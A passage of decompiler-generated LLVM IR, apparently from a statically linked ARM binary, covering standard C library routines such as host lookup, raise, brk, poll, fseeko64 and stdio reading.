  uselistorder i32 %v2_18520, { 5, 6, 8, 7, 3, 4, 0, 1, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 0, 5, 3, 4, 6, 16, 9, 7, 8, 10, 2, 11, 1, 12, 14, 13, 17, 15 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 20, 6, 5, 7, 9, 8, 11, 10, 13, 12, 21, 14, 15, 19, 16, 18, 23, 22, 17, 28, 27, 24, 26, 0, 25 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 ()* @free, { 17, 15, 14, 13, 12, 11, 10, 3, 2, 9, 8, 7, 6, 5, 16, 20, 19, 18, 4, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_33928.1310 to i32), { 3, 5, 1, 0, 4, 2 }
  uselistorder i32* @global_var_33948.1306, { 2, 3, 1, 0, 7, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_33948.1306 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_33938.1138 to i32), { 1, 0, 2 }
  uselistorder i8 32, { 0, 1, 2, 5, 3, 4, 7, 8, 9, 10, 6, 11, 12, 13 }
  uselistorder i32* @global_var_33944.1135, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_18794, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1858c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_18738, { 1, 0 }
  uselistorder label %dec_label_pc_186e8, { 1, 0 }
  uselistorder label %dec_label_pc_18700.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_186bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18698, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %dec_label_pc_18644, { 1, 0 }
  uselistorder label %dec_label_pc_18640, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18624, { 1, 0 }
  uselistorder label %dec_label_pc_18610, { 1, 0 }
  uselistorder label %dec_label_pc_185f0, { 1, 0 }
  uselistorder label %dec_label_pc_1875c.backedge, { 1, 0, 3, 5, 2, 4 }
  uselistorder label %dec_label_pc_185ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1875c.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_1882c = call i32 @__read_etc_hosts_r()
  ret i32 %v0_1882c
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v3_18838 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_18840 = call i32 @__libc_getpid()
  store i32 %v3_18838, i32* @r4, align 4
  %v0_1884c = call i32 @kill()
  ret i32 %v0_1884c

; uselistorder directives
  uselistorder i32 ()* @kill, { 3, 4, 2, 1, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_18850 = add i32 %arg1, 28
  %v2_18850 = inttoptr i32 %v1_18850 to i32*
  %v3_18850 = load i32, i32* %v2_18850, align 4
  %v1_18858 = add i32 %arg1, 44
  %v2_18858 = inttoptr i32 %v1_18858 to i32*
  %v3_18858 = load i32, i32* %v2_18858, align 4
  store i32 %v3_18850, i32* @global_var_3394c.1336, align 4
  store i32 %v3_18858, i32* @global_var_33950.1338, align 4
  ret i32 %arg1
}

define i32 @__GI_brk(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1887c = call i32 @brk(i32* %arg1)
  %v3_18880 = icmp ult i32 %v2_1887c, %tmp
  store i32 %v2_1887c, i32* @global_var_3387c.1267, align 4
  br i1 %v3_18880, label %dec_label_pc_18894, label %dec_label_pc_188a4

dec_label_pc_18894:                               ; preds = %entry
  %v0_18894 = call i32 @__errno_location()
  %v2_1889c = inttoptr i32 %v0_18894 to i32*
  store i32 12, i32* %v2_1889c, align 4
  br label %dec_label_pc_188a4

dec_label_pc_188a4:                               ; preds = %entry, %dec_label_pc_18894
  %v0_188a4 = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_18894 ]
  ret i32 %v0_188a4

; uselistorder directives
  uselistorder i32* @global_var_3387c.1267, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_188a4, { 1, 0 }
}

define i32 @__libc_poll(%pollfd* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_188b0 = load i32, i32* @r4, align 4
  store i32 %v3_188b0, i32* %stack_var_-8, align 4
  %v5_188b4 = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v5_188b4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_188b4, -4095
  br i1 %tmp, label %dec_label_pc_188d4, label %dec_label_pc_188c4

dec_label_pc_188c4:                               ; preds = %entry
  %v0_188c4 = call i32 @__errno_location()
  %v0_188c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_188c8 = sub i32 0, %v0_188c8
  %v2_188cc = inttoptr i32 %v0_188c4 to i32*
  store i32 %v1_188c8, i32* %v2_188cc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_188d4

dec_label_pc_188d4:                               ; preds = %entry, %dec_label_pc_188c4
  %v0_188d4 = phi i32 [ %v5_188b4, %entry ], [ -1, %dec_label_pc_188c4 ]
  %v2_188d8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_188d8, i32* @r4, align 4
  ret i32 %v0_188d4

; uselistorder directives
  uselistorder i32 %v5_188b4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_188d4, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_188dc = load i32, i32* @r2, align 4
  store i32 %v0_188dc, i32* @r3, align 4
  %v0_188e4 = call i32 @__GI_fseeko64()
  ret i32 %v0_188e4
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_188e8 = load i32, i32* @r4, align 4
  %v6_188e8 = load i32, i32* @r5, align 4
  %v9_188e8 = load i32, i32* @r6, align 4
  %v0_188ec = load i32, i32* @r3, align 4
  %v2_188f0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v0_188ec, i32* @r6, align 4
  %v0_188f8 = load i32, i32* @r0, align 4
  store i32 %v0_188f8, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_188ec, 3
  br i1 %tmp, label %dec_label_pc_18914, label %dec_label_pc_18900

dec_label_pc_18900:                               ; preds = %entry
  %v0_18900 = call i32 @__errno_location()
  store i32 %v0_18900, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_1890c = inttoptr i32 %v0_18900 to i32*
  store i32 22, i32* %v2_1890c, align 4
  br label %.thread3

dec_label_pc_18914:                               ; preds = %entry
  %v1_18914 = add i32 %v0_188f8, 52
  %v2_18914 = inttoptr i32 %v1_18914 to i32*
  %v3_18914 = load i32, i32* %v2_18914, align 4
  store i32 %v3_18914, i32* %r7.global-to-local, align 4
  %v2_18918 = icmp eq i32 %v3_18914, 0
  %v0_1891c = load i32, i32* @r1, align 4
  store i32 %v0_1891c, i32* %stack_var_-28, align 4
  br i1 %v2_18918, label %dec_label_pc_18928, label %dec_label_pc_18954

dec_label_pc_18928:                               ; preds = %dec_label_pc_18914
  %v1_18928 = add i32 %v0_188f8, 56
  store i32 %v1_18928, i32* @r4, align 4
  store i32 90076, i32* %r3.global-to-local, align 4
  store i32 %v2_188f0, i32* @r0, align 4
  store i32 %v1_18928, i32* %r2.global-to-local, align 4
  %v1_18940 = call i32 @__pthread_return_void()
  %v0_18944 = load i32, i32* @r4, align 4
  store i32 %v0_18944, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_15fd4.998 to i32), i32* %r3.global-to-local, align 4
  store i32 100692, i32* @lr, align 4
  %v1_18950 = call i32 @__pthread_return_0()
  store i32 %v1_18950, i32* %r0.global-to-local, align 4
  %v0_18954.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18954

dec_label_pc_18954:                               ; preds = %dec_label_pc_18914, %dec_label_pc_18928
  %v0_18960 = phi i32 [ %v0_188f8, %dec_label_pc_18914 ], [ %v0_18954.pre, %dec_label_pc_18928 ]
  %v1_18954 = inttoptr i32 %v0_18960 to i8*
  %v2_18954 = load i8, i8* %v1_18954, align 1
  %v3_18954 = zext i8 %v2_18954 to i32
  store i32 %v3_18954, i32* %r3.global-to-local, align 4
  %v1_18958 = and i32 %v3_18954, 64
  %v2_18958 = icmp eq i32 %v1_18958, 0
  br i1 %v2_18958, label %dec_label_pc_18970, label %dec_label_pc_18960

dec_label_pc_18960:                               ; preds = %dec_label_pc_18954
  store i32 %v0_18960, i32* @r0, align 4
  %v0_18964 = call i32 @__stdio_wcommit()
  store i32 %v0_18964, i32* %r0.global-to-local, align 4
  %v2_18968 = icmp eq i32 %v0_18964, 0
  br i1 %v2_18968, label %dec_label_pc_18970, label %dec_label_pc_189e0

dec_label_pc_18970:                               ; preds = %dec_label_pc_18960, %dec_label_pc_18954
  %v0_18970 = load i32, i32* @r6, align 4
  %v7_18970 = icmp eq i32 %v0_18970, 1
  br i1 %v7_18970, label %dec_label_pc_18978, label %dec_label_pc_18970.dec_label_pc_1898c_crit_edge

dec_label_pc_18970.dec_label_pc_1898c_crit_edge:  ; preds = %dec_label_pc_18970
  br label %dec_label_pc_1898c

dec_label_pc_18978:                               ; preds = %dec_label_pc_18970
  %v0_18978 = load i32, i32* @r5, align 4
  store i32 %v0_18978, i32* %r0.global-to-local, align 4
  %v2_1897c = ptrtoint i32* %stack_var_-28 to i32
  %v2_18980 = inttoptr i32 %v0_18978 to i8*
  %v3_18980 = call i32 @__stdio_adjust_position(i8* %v2_18980, i32 %v2_1897c)
  store i32 %v3_18980, i32* %r0.global-to-local, align 4
  %v1_18984 = icmp slt i32 %v3_18980, 0
  br i1 %v1_18984, label %dec_label_pc_189e0, label %dec_label_pc_18978.dec_label_pc_1898c_crit_edge

dec_label_pc_18978.dec_label_pc_1898c_crit_edge:  ; preds = %dec_label_pc_18978
  %v0_1898c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1898c

dec_label_pc_1898c:                               ; preds = %dec_label_pc_18970.dec_label_pc_1898c_crit_edge, %dec_label_pc_18978.dec_label_pc_1898c_crit_edge
  %v0_1898c = phi i32 [ %v0_18970, %dec_label_pc_18970.dec_label_pc_1898c_crit_edge ], [ %v0_1898c.pre, %dec_label_pc_18978.dec_label_pc_1898c_crit_edge ]
  store i32 %v0_1898c, i32* %r2.global-to-local, align 4
  %v0_18990 = load i32, i32* @r5, align 4
  store i32 %v0_18990, i32* %r0.global-to-local, align 4
  %v4_18998 = call i32 @__stdio_seek(i32 %v0_18990, i32* nonnull %stack_var_-28, i32 %v0_1898c)
  store i32 %v4_18998, i32* %r0.global-to-local, align 4
  %v1_1899c = icmp slt i32 %v4_18998, 0
  br i1 %v1_1899c, label %dec_label_pc_189e0, label %dec_label_pc_189a4

dec_label_pc_189a4:                               ; preds = %dec_label_pc_1898c
  %v0_189a4 = load i32, i32* @r5, align 4
  %v1_189a4 = inttoptr i32 %v0_189a4 to i32*
  %v2_189a4 = load i32, i32* %v1_189a4, align 4
  store i32 %v2_189a4, i32* %r3.global-to-local, align 4
  %v1_189a8 = add i32 %v0_189a4, 8
  %v2_189a8 = inttoptr i32 %v1_189a8 to i32*
  %v3_189a8 = load i32, i32* %v2_189a8, align 4
  store i32 %v3_189a8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_189b0 = and i32 %v2_189a4, -72
  store i32 %v1_189b0, i32* %r3.global-to-local, align 4
  %v3_189b4 = sdiv i32 %v2_189a4, 256
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_189bc = trunc i32 %v3_189b4 to i8
  %v3_189bc = add i32 %v0_189a4, 1
  %v4_189bc = inttoptr i32 %v3_189bc to i8*
  store i8 %v1_189bc, i8* %v4_189bc, align 1
  %v0_189c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_189c0 = load i32, i32* @r5, align 4
  %v2_189c0 = add i32 %v1_189c0, 28
  %v3_189c0 = inttoptr i32 %v2_189c0 to i32*
  store i32 %v0_189c0, i32* %v3_189c0, align 4
  %v0_189c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_189c4 = trunc i32 %v0_189c4 to i8
  %v2_189c4 = load i32, i32* @r5, align 4
  %v3_189c4 = add i32 %v2_189c4, 2
  %v4_189c4 = inttoptr i32 %v3_189c4 to i8*
  store i8 %v1_189c4, i8* %v4_189c4, align 1
  %v0_189c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_189c8 = trunc i32 %v0_189c8 to i8
  %v2_189c8 = load i32, i32* @r5, align 4
  %v3_189c8 = inttoptr i32 %v2_189c8 to i8*
  store i8 %v1_189c8, i8* %v3_189c8, align 1
  %v0_189cc = load i32, i32* %r2.global-to-local, align 4
  %v1_189cc = load i32, i32* @r5, align 4
  %v2_189cc = add i32 %v1_189cc, 16
  %v3_189cc = inttoptr i32 %v2_189cc to i32*
  store i32 %v0_189cc, i32* %v3_189cc, align 4
  %v0_189d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_189d0 = load i32, i32* @r5, align 4
  %v2_189d0 = add i32 %v1_189d0, 20
  %v3_189d0 = inttoptr i32 %v2_189d0 to i32*
  store i32 %v0_189d0, i32* %v3_189d0, align 4
  %v0_189d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_189d4 = load i32, i32* @r5, align 4
  %v2_189d4 = add i32 %v1_189d4, 24
  %v3_189d4 = inttoptr i32 %v2_189d4 to i32*
  store i32 %v0_189d4, i32* %v3_189d4, align 4
  %v0_189d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_189d8 = load i32, i32* @r5, align 4
  %v2_189d8 = add i32 %v1_189d8, 44
  %v3_189d8 = inttoptr i32 %v2_189d8 to i32*
  store i32 %v0_189d8, i32* %v3_189d8, align 4
  br label %dec_label_pc_189e4

dec_label_pc_189e0:                               ; preds = %dec_label_pc_18960, %dec_label_pc_1898c, %dec_label_pc_18978
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_189e4

dec_label_pc_189e4:                               ; preds = %dec_label_pc_189a4, %dec_label_pc_189e0
  %v0_189e4 = load i32, i32* %r7.global-to-local, align 4
  %v2_189e4 = icmp eq i32 %v0_189e4, 0
  br i1 %v2_189e4, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_189e4
  store i32 %v2_188f0, i32* %r0.global-to-local, align 4
  store i32 90076, i32* %r3.global-to-local, align 4
  store i32 100860, i32* @lr, align 4
  call void @__pseudo_branch(i32 90076)
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_189e4, %dec_label_pc_18900, %bb
  %v0_189fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_189fc, i32* %r0.global-to-local, align 4
  store i32 %v3_188e8, i32* @r4, align 4
  store i32 %v6_188e8, i32* @r5, align 4
  store i32 %v9_188e8, i32* @r6, align 4
  ret i32 %v0_189fc

; uselistorder directives
  uselistorder i32 %v0_1898c, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 9, 8, 11, 0, 10, 12 }
  uselistorder i32 ()* @__pthread_return_0, { 45, 32, 31, 30, 29, 28, 27, 26, 1, 44, 24, 23, 15, 4, 3, 2, 21, 20, 19, 18, 14, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 25, 38, 37, 36, 40, 39, 17, 35, 16, 46, 22, 34, 33, 43, 42, 41 }
  uselistorder i32 ptrtoint (i8* @global_var_15fd4.998 to i32), { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__pthread_return_void, { 48, 45, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 1, 0, 47, 46, 9, 8, 7, 6, 3, 2, 11, 10, 34, 33, 32, 31, 30, 38, 37, 36, 35, 5, 29, 4, 49, 28, 27, 26, 25, 44, 43, 42, 41, 40, 39 }
  uselistorder i32 90076, { 0, 6, 7, 8, 9, 1, 10, 11, 12, 2, 3, 4, 5, 13 }
  uselistorder i32 22, { 3, 12, 4, 11, 5, 6, 7, 16, 13, 8, 14, 0, 15, 9, 10, 1, 2, 17 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_189e4, { 1, 0 }
  uselistorder label %dec_label_pc_189e0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1898c, { 1, 0 }
  uselistorder label %dec_label_pc_18954, { 1, 0 }
}

define i32 @__stdio_READ(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18a18 = load i32, i32* @r4, align 4
  store i32 %v3_18a18, i32* %stack_var_-12, align 4
  %v3_18a1c = load i8, i8* %arg1, align 1
  %v4_18a1c = zext i8 %v3_18a1c to i32
  store i32 %v4_18a1c, i32* %r3.global-to-local, align 4
  %v1_18a20 = and i32 %v4_18a1c, 4
  store i32 %v1_18a20, i32* %r5.global-to-local, align 4
  %v2_18a20 = icmp eq i32 %v1_18a20, 0
  store i1 %v2_18a20, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v2_18a20, label %bb8, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_18a18, i32* @r4, align 4
  ret i32 0

bb8:                                              ; preds = %entry
  %v1_18a30 = icmp slt i32 %arg2, 0
  %v2_18a30 = icmp eq i32 %arg2, 0
  store i1 %v2_18a30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_18a30, label %bb9, label %bb10

bb9:                                              ; preds = %bb8
  store i32 2147483647, i32* @r2, align 4
  br label %bb10

bb10:                                             ; preds = %bb8, %bb9
  %v1_18a38 = add i32 %tmp, 4
  %v2_18a38 = inttoptr i32 %v1_18a38 to i32*
  %v3_18a38 = load i32, i32* %v2_18a38, align 4
  store i32 %v3_18a38, i32* %r0.global-to-local, align 4
  %v1_18a3c = call i32 @__libc_read(i32 %v3_18a38)
  store i32 %v1_18a3c, i32* %r0.global-to-local, align 4
  %v2_18a40 = icmp eq i32 %v1_18a3c, 0
  store i1 %v2_18a40, i1* %cpsr_z.global-to-local, align 1
  %tmp11 = icmp slt i32 %v1_18a3c, 1
  br i1 %tmp11, label %bb13, label %bb12

bb12:                                             ; preds = %bb10
  %v7_18a44 = load i32, i32* %stack_var_-12, align 4
  store i32 %v7_18a44, i32* @r4, align 4
  ret i32 %v1_18a3c

bb13:                                             ; preds = %bb10
  %v0_18a48 = load i32, i32* @r4, align 4
  %v1_18a48 = inttoptr i32 %v0_18a48 to i32*
  %v2_18a48 = load i32, i32* %v1_18a48, align 4
  %v1_18a4c = or i32 %v2_18a48, 8
  store i32 %v1_18a4c, i32* %r1.global-to-local, align 4
  %v1_18a50 = or i32 %v2_18a48, 4
  store i32 %v1_18a50, i32* %r3.global-to-local, align 4
  %v3_18a54 = sdiv i32 %v2_18a48, 256
  store i32 %v3_18a54, i32* %ip.global-to-local, align 4
  br i1 %v2_18a40, label %.thread, label %bb14

bb14:                                             ; preds = %bb13
  %v1_18a5c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_18a5c, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread:                                          ; preds = %bb13
  %v2_18a60 = trunc i32 %v3_18a54 to i8
  %v4_18a60 = add i32 %v0_18a48, 1
  %v5_18a60 = inttoptr i32 %v4_18a60 to i8*
  store i8 %v2_18a60, i8* %v5_18a60, align 1
  %v0_18a64.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18a64.pr, label %.thread1, label %.thread2

.thread1:                                         ; preds = %.thread
  %v1_18a64 = load i32, i32* %r3.global-to-local, align 4
  %v2_18a64 = trunc i32 %v1_18a64 to i8
  %v3_18a64 = load i32, i32* @r4, align 4
  %v4_18a64 = inttoptr i32 %v3_18a64 to i8*
  store i8 %v2_18a64, i8* %v4_18a64, align 1
  %v0_18a68.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18a68.pr.pr, label %.thread3, label %.thread2

.thread2:                                         ; preds = %bb14, %.thread, %.thread1
  %v1_18a68 = load i32, i32* %ip.global-to-local, align 4
  %v2_18a68 = trunc i32 %v1_18a68 to i8
  %v3_18a68 = load i32, i32* @r4, align 4
  %v4_18a68 = add i32 %v3_18a68, 1
  %v5_18a68 = inttoptr i32 %v4_18a68 to i8*
  store i8 %v2_18a68, i8* %v5_18a68, align 1
  %v0_18a6c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18a6c.pr, label %.thread3, label %bb15

bb15:                                             ; preds = %.thread2
  %v1_18a6c = load i32, i32* %r1.global-to-local, align 4
  %v2_18a6c = trunc i32 %v1_18a6c to i8
  %v3_18a6c = load i32, i32* @r4, align 4
  %v4_18a6c = inttoptr i32 %v3_18a6c to i8*
  store i8 %v2_18a6c, i8* %v4_18a6c, align 1
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %.thread2, %bb15
  %v2_18a70 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18a70, i32* @r4, align 4
  %v11_18a70 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_18a70

; uselistorder directives
  uselistorder i32 %v3_18a54, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 1, 5, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 (i32)* @__libc_read, { 1, 0 }
  uselistorder i32 2147483647, { 2, 3, 0, 1 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_adjust_position(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_18a74 = load i32, i32* @r4, align 4
  store i32 %v3_18a74, i32* %stack_var_-16, align 4
  %v2_18a78 = add i32 %tmp, 1
  %v3_18a78 = inttoptr i32 %v2_18a78 to i8*
  %v4_18a78 = load i8, i8* %v3_18a78, align 1
  %v5_18a78 = zext i8 %v4_18a78 to i32
  %v3_18a7c = load i8, i8* %arg1, align 1
  %v4_18a7c = zext i8 %v3_18a7c to i32
  store i32 %v4_18a7c, i32* %r2.global-to-local, align 4
  %v4_18a80 = mul nuw nsw i32 %v5_18a78, 256
  %v5_18a80 = or i32 %v4_18a7c, %v4_18a80
  store i32 %v5_18a80, i32* @lr, align 4
  %tmp15 = urem i8 %v3_18a7c, 4
  %v2_18a84 = icmp eq i8 %tmp15, 0
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_18a84, label %bb, label %dec_label_pc_18a94

bb:                                               ; preds = %entry
  br label %.thread

dec_label_pc_18a94:                               ; preds = %entry
  %v1_18a84 = zext i8 %tmp15 to i32
  %v1_18a94 = add nsw i32 %v1_18a84, -1
  %v7_18a94 = icmp eq i8 %tmp15, 1
  br i1 %v7_18a94, label %.thread, label %dec_label_pc_18a9c

dec_label_pc_18a9c:                               ; preds = %dec_label_pc_18a94
  %v1_18a9c = and i32 %v4_18a80, 2048
  %v2_18a9c = icmp eq i32 %v1_18a9c, 0
  br i1 %v2_18a9c, label %.thread, label %dec_label_pc_18aa4

dec_label_pc_18aa4:                               ; preds = %dec_label_pc_18a9c
  %v8_18aa8 = icmp sgt i32 %v1_18a94, 1
  br i1 %v8_18aa8, label %dec_label_pc_18b34, label %dec_label_pc_18aac

dec_label_pc_18aac:                               ; preds = %dec_label_pc_18aa4
  %v2_18aac = add i32 %tmp, 40
  %v3_18aac = inttoptr i32 %v2_18aac to i32*
  %v4_18aac = load i32, i32* %v3_18aac, align 4
  %v2_18ab0 = icmp eq i32 %v4_18aac, 0
  br i1 %v2_18ab0, label %dec_label_pc_18ab8, label %dec_label_pc_18b34

dec_label_pc_18ab8:                               ; preds = %dec_label_pc_18aac
  %v2_18ab8 = add i32 %tmp, 3
  %v3_18ab8 = inttoptr i32 %v2_18ab8 to i8*
  %v4_18ab8 = load i8, i8* %v3_18ab8, align 1
  %v5_18ab8 = zext i8 %v4_18ab8 to i32
  %v2_18abc = add i32 %tmp, 44
  %v3_18abc = inttoptr i32 %v2_18abc to i32*
  %v4_18abc = load i32, i32* %v3_18abc, align 4
  store i32 %v4_18abc, i32* %r2.global-to-local, align 4
  %v2_18ac0 = sub nsw i32 %v1_18a94, %v5_18ab8
  %v1_18ac8 = add nsw i32 %v2_18ac0, -1
  %tmp11 = icmp slt i32 %v4_18abc, 1
  br i1 %tmp11, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_18ab8
  %v7_18acc = add i32 %tmp, 2
  %v8_18acc = inttoptr i32 %v7_18acc to i8*
  %v9_18acc = load i8, i8* %v8_18acc, align 1
  %v10_18acc = zext i8 %v9_18acc to i32
  %v7_18ad0 = sub nsw i32 %v1_18ac8, %v10_18acc
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_18ab8, %bb, %dec_label_pc_18a9c, %dec_label_pc_18a94, %bb12
  %v0_18aec = phi i32 [ %v1_18a94, %dec_label_pc_18a9c ], [ %v1_18a94, %dec_label_pc_18a94 ], [ 0, %bb ], [ %v7_18ad0, %bb12 ], [ %v1_18ac8, %dec_label_pc_18ab8 ]
  %v1_18ad4 = and i32 %v4_18a7c, 64
  %v2_18ad4 = icmp eq i32 %v1_18ad4, 0
  %storemerge.in.in.v = select i1 %v2_18ad4, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_18ae0 = add i32 %tmp, 16
  %v3_18ae0 = inttoptr i32 %v2_18ae0 to i32*
  %v4_18ae0 = load i32, i32* %v3_18ae0, align 4
  %v2_18ae4 = sub i32 %storemerge, %v4_18ae0
  %v1_18ae8 = inttoptr i32 %arg2 to i32*
  %v2_18ae8 = load i32, i32* %v1_18ae8, align 4
  store i32 %v2_18ae8, i32* %r1.global-to-local, align 4
  %v3_18ae8 = add i32 %arg2, 4
  %v4_18ae8 = inttoptr i32 %v3_18ae8 to i32*
  %v5_18ae8 = load i32, i32* %v4_18ae8, align 4
  store i32 %v5_18ae8, i32* %r2.global-to-local, align 4
  %v2_18aec = add i32 %v2_18ae4, %v0_18aec
  store i32 %v2_18aec, i32* %r5.global-to-local, align 4
  %v2_18af0 = sub i32 %v2_18ae8, %v2_18aec
  %v2_18af4 = and i32 %v2_18aec, 1073741824
  %v3_18af4 = icmp ne i32 %v2_18af4, 0
  %v6_18af4 = icmp eq i1 %v3_18af4, false
  %tmp16 = icmp slt i32 %v2_18aec, 0
  %v4_18af4.neg = zext i1 %tmp16 to i32
  %v7_18af4 = add i32 %v5_18ae8, %v4_18af4.neg
  %v9_18af4 = sext i1 %v6_18af4 to i32
  %v10_18af4 = add i32 %v7_18af4, %v9_18af4
  store i32 %v10_18af4, i32* %r4.global-to-local, align 4
  store i32 %v2_18af0, i32* %v1_18ae8, align 4
  %v5_18af8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18af8, i32* %v4_18ae8, align 4
  %v0_18afc = load i32, i32* %r6.global-to-local, align 4
  %v1_18afc = add i32 %v0_18afc, 4
  %v2_18afc = inttoptr i32 %v1_18afc to i32*
  %v3_18afc = load i32, i32* %v2_18afc, align 4
  %v1_18b00 = load i32, i32* %r2.global-to-local, align 4
  %v8_18b04 = icmp sgt i32 %v3_18afc, %v1_18b00
  br i1 %v8_18b04, label %dec_label_pc_18b18, label %dec_label_pc_18b08

dec_label_pc_18b08:                               ; preds = %.thread
  %v9_18b00 = icmp eq i32 %v3_18afc, %v1_18b00
